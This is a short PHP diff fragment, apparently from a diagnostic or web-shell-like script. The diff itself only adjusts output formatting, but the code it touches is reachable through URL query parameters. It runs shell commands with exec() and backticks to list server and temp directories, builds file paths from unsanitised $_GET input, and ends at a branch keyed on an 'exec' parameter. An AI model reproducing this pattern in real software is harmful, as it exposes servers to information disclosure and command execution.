@@ -121,23 +121,27 @@ if(file_exists(sys_get_temp_dir().'Tux'.$_GET['tempFile4']) ){
 exit();
 }
 else if(isset($_GET['tempFile5'])){
+	echo '<pre>';
 echo exec('ls -la '.sys_get_temp_dir());
 $temp_file = tempnam(sys_get_temp_dir(), 'Tux'.$_GET['tempFile5']);
-echo 'tmp file: '. $temp_file .'<br><br>';
+echo '<Br>tmp file: '. $temp_file .'<br><br>';
 echo exec('ls -la '.sys_get_temp_dir());
+	echo '</pre>';
 	exit();
 }
 else if(isset($_GET['tempFile6'])){
 //echo exec('ls '.sys_get_temp_dir());
+	echo '<pre>';
+
 $c = `ls -la`;
-	echo $c .'<Br>';
+	echo $c .'<Br><Br>';
 	$c= `ls -la /tmp/`;
-	echo $c .'<Br>';
+	echo $c .'<Br><Br>';
 	$c = sys_get_temp_dir();
-	echo $c .'<Br>';
+	echo $c .'<Br><Br>';
 	$c= `ls -la {$c}`;
-	echo $c .'<Br>';
-	
+	echo $c .'<Br><Br>';
+	echo '</pre>';
 	exit();
 }
 else if(isset($_GET['exec'])){	
